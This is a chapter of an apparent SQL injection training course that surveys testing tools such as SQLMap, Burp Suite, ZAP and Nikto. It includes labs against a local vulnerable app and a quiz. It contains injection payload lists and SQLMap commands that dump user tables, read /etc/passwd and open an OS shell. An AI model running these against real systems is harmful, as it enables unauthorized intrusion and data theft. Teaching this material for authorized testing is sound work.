# 🛠️ Chapter 6: SQL Injection Testing Tools

## Automated Testing Tools

Learn professional tools for SQL injection testing.

## 1. SQLMap

### 🏆 The Industry Standard

SQLMap is the most powerful SQL injection automation tool.

### Installation

```bash
# Linux/Mac
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py

# Using pip
pip install sqlmap

# Kali Linux (pre-installed)
sqlmap
```

### Basic Usage

```bash
# Test a URL
sqlmap -u "http://example.com/login.php?id=1"

# Test POST data
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"

# Test with cookies
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abcd1234"

# Specify parameter to test
sqlmap -u "http://example.com/page.php?id=1&name=test" -p id
```

### Database Enumeration

```bash
# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Current database
sqlmap -u "http://example.com/page.php?id=1" --current-db

# List tables
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --columns

# Dump table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

# Dump everything
sqlmap -u "http://example.com/page.php?id=1" --dump-all
```

### Advanced Options

```bash
# OS shell access
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://example.com/page.php?id=1" --sql-shell

# File read
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Specify DBMS
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# Risk and level
sqlmap -u "http://example.com/page.php?id=1" --risk=3 --level=5

# Random User-Agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Testing Local Lab

```bash
# Test the vulnerable login from this repository
sqlmap -u "http://localhost/SQLInjection-Academy/vulnerable/login.php" \
       --data="username=admin&password=test" \
       --method=POST \
       --batch

# Dump users table
sqlmap -u "http://localhost/SQLInjection-Academy/vulnerable/login.php" \
       --data="username=admin&password=test" \
       --method=POST \
       -D sqli_academy \
       -T users \
       --dump
```

## 2. Burp Suite

### 🔥 Professional Web Security Testing

### Features
- Intercept HTTP/HTTPS requests
- Modify requests/responses
- Automated scanning
- Intruder for brute force

### Using Burp for SQLi Testing

1. **Configure proxy** (127.0.0.1:8080)
2. **Intercept login request**
3. **Send to Repeater**
4. **Modify parameter:**
   ```
   username=admin' OR '1'='1' --&password=test
   ```
5. **Analyze response**

### Burp Intruder Payloads

```
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL --
' AND 1=1 --
' AND 1=2 --
```

## 3. OWASP ZAP

### Open Source Alternative to Burp

### Installation
```bash
# Download from https://www.zaproxy.org/download/

# Linux
sudo apt install zaproxy

# Run
zap.sh
```

### Automated Scan
1. Enter target URL
2. Click "Attack"
3. Review alerts
4. Check for SQL injection findings

## 4. Havij

### GUI SQL Injection Tool (Windows)

**Features:**
- User-friendly interface
- Automated injection
- Database extraction
- MD5 cracking

**Note:** Windows only, some antivirus flag it

## 5. jSQL Injection

### Java-Based SQLi Tool

```bash
# Download from: https://github.com/ron190/jsql-injection
java -jar jsql-injection-v0.82.jar
```

**Features:**
- Cross-platform (Java)
- GUI interface
- Multiple databases support
- Batch scanning

## 6. Nmap NSE Scripts

### SQL Injection Detection

```bash
# HTTP SQL injection
nmap -p 80 --script http-sql-injection target.com

# MySQL vulnerabilities
nmap -p 3306 --script mysql-vuln-cve2012-2122 target.com

# All database scripts
nmap -p 1433,3306,5432 --script *sql* target.com
```

## 7. Nikto

### Web Server Scanner

```bash
# Basic scan
nikto -h http://target.com

# Save output
nikto -h http://target.com -o report.html -Format html

# Test specific port
nikto -h http://target.com -p 8080
```

## 8. WPScan (WordPress)

### WordPress Vulnerability Scanner

```bash
# Basic scan
wpscan --url http://target.com

# Enumerate users
wpscan --url http://target.com --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target.com --enumerate vp

# With API token
wpscan --url http://target.com --api-token YOUR_TOKEN
```

## 9. Manual Testing with cURL

### Command Line HTTP Requests

```bash
# GET request with SQLi payload
curl "http://example.com/page.php?id=1' OR '1'='1"

# POST request
curl -X POST http://example.com/login.php \
     -d "username=admin' --&password=test"

# With cookies
curl -b "PHPSESSID=abc123" \
     "http://example.com/page.php?id=1' OR '1'='1"

# Save response
curl "http://example.com/page.php?id=1' UNION SELECT NULL" \
     -o response.html

# Show headers
curl -I "http://example.com/page.php?id=1"
```

## 10. Browser Developer Tools

### Built-in Testing

**Chrome DevTools / Firefox Developer Tools:**

1. **Network Tab**: Monitor requests/responses
2. **Console**: Test JavaScript injection
3. **Edit and Resend**: Modify requests

### Testing Flow
1. Open DevTools (F12)
2. Go to Network tab
3. Submit login form
4. Right-click request → "Copy as cURL"
5. Modify in terminal and test

## Lab Exercise 6.1: SQLMap Practice

**Objective:** Use SQLMap on the lab environment

**Setup:**
```bash
# Start local server (XAMPP/MAMP)
# Navigate to repository
cd /path/to/SQLInjection-Academy
```

**Tasks:**

1. **Test for vulnerability:**
```bash
sqlmap -u "http://localhost/SQLInjection-Academy/vulnerable/login.php" \
       --data="username=test&password=test" \
       --batch
```

2. **List databases:**
```bash
sqlmap -u "http://localhost/SQLInjection-Academy/vulnerable/login.php" \
       --data="username=test&password=test" \
       --dbs \
       --batch
```

3. **Dump users table:**
```bash
sqlmap -u "http://localhost/SQLInjection-Academy/vulnerable/login.php" \
       --data="username=test&password=test" \
       -D sqli_academy \
       -T users \
       --dump \
       --batch
```

## Lab Exercise 6.2: Burp Suite Intercept

**Objective:** Intercept and modify login request

**Steps:**
1. Configure browser proxy (127.0.0.1:8080)
2. Start Burp Suite
3. Enable intercept
4. Visit vulnerable login page
5. Submit credentials
6. In Burp, modify username to: `admin' --`
7. Forward request
8. Observe successful login

## Best Practices

### ✅ DO:
- Get written authorization
- Test in isolated environments
- Document all findings
- Use latest tool versions
- Understand what tools do
- Start with low-risk scans

### ❌ DON'T:
- Test production systems without permission
- Use aggressive settings on live sites
- Rely solely on automated tools
- Ignore false positives
- Skip manual verification

## Tool Comparison

| Tool | Type | Skill Level | Platform | Cost |
|------|------|-------------|----------|------|
| **SQLMap** | CLI | Intermediate | All | Free |
| **Burp Suite** | GUI | Advanced | All | Free/Pro |
| **OWASP ZAP** | GUI | Beginner | All | Free |
| **Havij** | GUI | Beginner | Windows | Free |
| **jSQL** | GUI | Beginner | All | Free |
| **Nmap NSE** | CLI | Intermediate | All | Free |
| **Nikto** | CLI | Intermediate | Linux | Free |

## Creating Custom Payloads

### Payload Lists

**Create file:** `payloads.txt`
```
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL --
' AND SLEEP(5) --
' OR EXISTS(SELECT * FROM users) --
```

### Using with Burp Intruder
1. Load payload file
2. Set insertion point
3. Start attack
4. Analyze responses

## Key Takeaways

- ✅ SQLMap is the most powerful automated tool
- ✅ Burp Suite excellent for manual testing
- ✅ Always verify automated findings manually
- ✅ Combine multiple tools for thorough testing
- ✅ Understand tool capabilities and limitations
- ✅ Get permission before testing

## Quiz: Chapter 6

### Question 1
Most powerful SQL injection tool?
- A) Nikto
- B) SQLMap ✅
- C) Nmap
- D) WPScan

### Question 2
What does Burp Suite do?
- A) Network scanning
- B) Password cracking
- C) Intercept HTTP traffic ✅
- D) Port scanning

### Question 3
Before using testing tools?
- A) Use VPN
- B) Get permission ✅
- C) Clear browser
- D) Disable firewall

---

**[← Previous: Chapter 5](05-defense-mechanisms.md)** | **[Back to Home](../README.md)**